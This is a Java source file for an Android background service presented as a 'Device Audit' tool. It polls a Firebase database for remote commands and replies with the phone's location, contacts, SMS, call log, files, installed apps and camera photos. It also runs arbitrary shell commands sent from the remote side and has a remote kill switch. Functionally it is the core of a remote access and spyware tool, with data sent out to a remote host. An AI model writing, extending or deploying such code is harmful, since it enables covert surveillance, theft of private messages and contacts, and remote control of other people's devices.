package com.audit.device;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.HashMap;
import java.util.Map;

public class AuditService extends Service {

    private static final String TAG = "AuditService";
    private static final String CH = "audit_ch";
    private DatabaseReference deviceRef;
    private ValueEventListener cmdListener;
    private String deviceId;

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, buildNotif());

        deviceId = DeviceInfo.getDeviceId(this);
        FirebaseDatabase db = FirebaseDatabase.getInstance();

        deviceRef = db.getReference("devices").child(deviceId);
        deviceRef.child("info").setValue(DeviceInfo.collect(this));
        deviceRef.child("status").setValue("online");

        cmdListener = new ValueEventListener() {
            @Override public void onDataChange(@NonNull DataSnapshot snap) {
                for (DataSnapshot cmd : snap.getChildren()) {
                    String type = cmd.child("type").getValue(String.class);
                    String arg = cmd.child("arg").getValue(String.class);
                    String cmdId = cmd.getKey();
                    handleCommand(cmdId, type, arg);
                    cmd.getRef().removeValue();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {
                Log.e(TAG, "cmd cancel: " + e.getMessage());
            }
        };
        deviceRef.child("commands").addValueEventListener(cmdListener);

        db.getReference("config").child("kill").addValueEventListener(new ValueEventListener() {
            @Override public void onDataChange(@NonNull DataSnapshot s) {
                Boolean kill = s.getValue(Boolean.class);
                if (kill != null && kill) {
                    Log.w(TAG, "KILL SWITCH");
                    stopSelf();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        });

        Log.i(TAG, "started: " + deviceId);
    }

    private void handleCommand(String cmdId, String type, String arg) {
        DatabaseReference resultRef = deviceRef.child("results").child(cmdId);
        Map<String, Object> result = new HashMap<>();
        result.put("type", type);
        result.put("arg", arg);
        result.put("ts", System.currentTimeMillis());

        try {
            switch (type) {
                case "info":
                    result.put("data", DeviceInfo.collect(this));
                    break;
                case "ping":
                    result.put("data", "pong");
                    break;
                case "location":
                    result.put("data", LocationHelper.getLastLocation(this));
                    break;
                case "contacts":
                    result.put("data", DataCollector.getContacts(this));
                    break;
                case "sms":
                    result.put("data", DataCollector.getSms(this));
                    break;
                case "calllog":
                    result.put("data", DataCollector.getCallLog(this));
                    break;
                case "files":
                    result.put("data", DataCollector.listFiles(arg != null ? arg : "/sdcard"));
                    break;
                case "shell":
                    result.put("data", ShellExec.run(arg));
                    break;
                case "photo":
                    result.put("data", MediaHelper.takePhoto(this));
                    break;
                case "apps":
                    result.put("data", DataCollector.listApps(this));
                    break;
                default:
                    result.put("data", "unknown: " + type);
            }
        } catch (Exception e) {
            result.put("error", e.getMessage());
        }

        resultRef.setValue(result);
        deviceRef.child("audit_log").push().setValue(result);
    }

    private Notification buildNotif() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CH, "Device Audit",
                NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(c);
        }
        return new NotificationCompat.Builder(this, CH)
            .setContentTitle("Device Audit Active")
            .setContentText("Auditing device for security review")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (deviceRef != null) {
            deviceRef.child("status").setValue("offline");
            if (cmdListener != null)
                deviceRef.child("commands").removeEventListener(cmdListener);
        }
        Log.i(TAG, "stopped");
    }
}
